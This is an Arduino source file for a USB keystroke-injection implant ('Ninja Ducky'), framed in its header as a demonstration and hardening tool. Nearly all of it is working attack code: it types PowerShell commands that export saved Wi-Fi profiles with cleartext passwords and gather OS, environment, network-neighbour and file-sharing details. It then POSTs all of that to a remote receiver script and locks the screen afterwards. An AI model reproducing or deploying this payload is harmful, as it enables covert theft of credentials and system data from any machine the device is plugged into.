/*
NINJA DUCKY V1.0
A collection of scripts designed to exfiltrate data using a HID USB implant sending securely to a remote web server for the purposes of demonstration and security hardening.

Author: Bob McKay
August 2022
GitHub: https://github.com/p0ep0e/ninja-ducky-toolkit
*/

#include <avr/pgmspace.h>
#include "DigiKeyboard.h"

const char string1[] PROGMEM = "mkdir Duck; cd Duck; mkdir Sys; mkdir Wifi; cd Sys";
const char string2[] PROGMEM = "gatherNetworkInfo.vbs";
const char string3[] PROGMEM = "netsh wlan export profile key=clear";
const char string4[] PROGMEM = "Get-Content *.xml ";
const char string5[] PROGMEM = " Set-Content wificnf.txt";
const char string6[] PROGMEM = "$wifi = Get-Content wificnf.txt -Raw";
const char string7[] PROGMEM = "$os = Get-Content osinfo.txt -Raw;$env = Get-Content envinfo.txt -Raw;$nearby = Get-Content Neighbors.txt -Raw;$smb = Get-Content FileSharing.txt -Raw";
const char string8[] PROGMEM = "$duckyToken='YourSecurityTokenHere'"; //This token needs to be reflectd on the NinjaDuckyReciever.php file to authorise the data receipt.
const char string9[] PROGMEM = "Invoke-WebRequest -Uri https://yourDomainName.com/NinjaDuckyReceiver.php -Method POST -Body "; //Update this to the location of your hosted NinjaDuckyReceiver script
const char string10[] PROGMEM = "{duckyToken=$duckyToken;wifiPwds=$wifi;osInfo=$os;smbInfo=$smb;envInfo=$env;nearby=$nearby}";


char buffer[151]; //as long as longest string + 1 for null
#define GetString( x ) (strcpy_P(buffer, (char*)x))

void printText( char * txt ) {
  int l = strlen(txt);
  for (int i = 0; i < l; i++) {
    DigiKeyboard.print( txt[i] );
    DigiKeyboard.update();
  }
}

void setup() {
// Don't need to set anything up to use DigiKeyboard
}

void loop() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(42);
DigiKeyboard.delay(200);
DigiKeyboard.print("powershell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(3000);
printText(GetString (string1));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(300);
printText(GetString (string2));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(10000); //A long delay here to allow time for the gatherNetworkInfo.vbs to run
DigiKeyboard.print("cd ../Wifi");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
printText(GetString (string3));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(150);
printText(GetString (string4));
DigiKeyboard.sendKeyStroke(100,MOD_SHIFT_LEFT);
printText(GetString (string5));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
printText(GetString (string6));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
DigiKeyboard.print("cd ../Sys/config");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
printText(GetString (string7));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(150);
printText(GetString (string8));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(150);
printText(GetString (string9));
DigiKeyboard.sendKeyStroke(52,MOD_SHIFT_LEFT);
printText(GetString (string10));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(2000);
DigiKeyboard.print("exit");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_L, MOD_GUI_LEFT); //Lock the computer now we're finished

int i =5000;
while (i > 0) { //Flash LEDs
i--;
digitalWrite(0, HIGH);
digitalWrite(1, HIGH);
delay(500);
digitalWrite(0, LOW);
digitalWrite(1, LOW);
delay(500);
}
  exit(0);  //Exit the loop to prevent it running again.
}
